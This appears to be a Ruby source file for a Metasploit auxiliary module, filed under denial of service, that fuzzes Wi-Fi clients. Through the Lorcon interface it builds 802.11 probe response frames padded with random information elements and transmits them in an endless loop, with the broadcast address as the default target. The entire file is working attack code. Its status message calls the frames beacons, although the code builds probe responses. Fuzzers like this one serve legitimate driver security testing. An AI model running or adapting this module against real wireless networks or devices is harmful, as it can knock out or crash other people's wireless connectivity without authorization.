require 'msf/core'

module Msf

class Auxiliary::Dos::Wireless::FuzzProbeResp < Msf::Auxiliary

	include Exploit::Lorcon


	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Wireless Probe Response Frame Fuzzer',
			'Description'    => %q{
				This module sends out corrupted probe response frames.
			},
			
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 3666 $'
		))
		register_options(
			[
				OptString.new('ADDR_DST', [ true,  "The MAC address of the target system",'FF:FF:FF:FF:FF:FF'])
			], self.class)					
	end

	def run
		open_wifi
		print_status("Sending corrupt beacon frames...")
		while (true)
			wifi.write(create_frame())
		end
	end
	
	def eton(addr)
		addr.split(':').map { |c| c.hex.chr }.join
	end

	def create_frame
		mtu      = 2312 # 1514
		ies      = rand(1024)

		bssid    = Rex::Text.rand_text(6)
		seq      = [rand(255)].pack('n')
		
		frame = 
			"\x50" +                      # type/subtype
			"\x00" +                      # flags
			"\x00\x00" +                  # duration  
			eton(datastore['ADDR_DST']) + # dst
			bssid +                       # src
			bssid +                       # bssid
			seq   +                       # seq  
			Rex::Text.rand_text(8) +      # timestamp value
			Rex::Text.rand_text(2) +      # beacon interval
			Rex::Text.rand_text(2)        # capability flags
		
		1.upto(ies) do |i|
			max = mtu - frame.length
			break if max < 2
			t = rand(0x30)
			l = (max - 2 == 0) ? 0 : (max > 255) ? rand(255) : rand(max - 1)
			d = Rex::Text.rand_text(l)
			frame += t.chr + l.chr + d
		end
		
		return frame

	end
	
end
end	
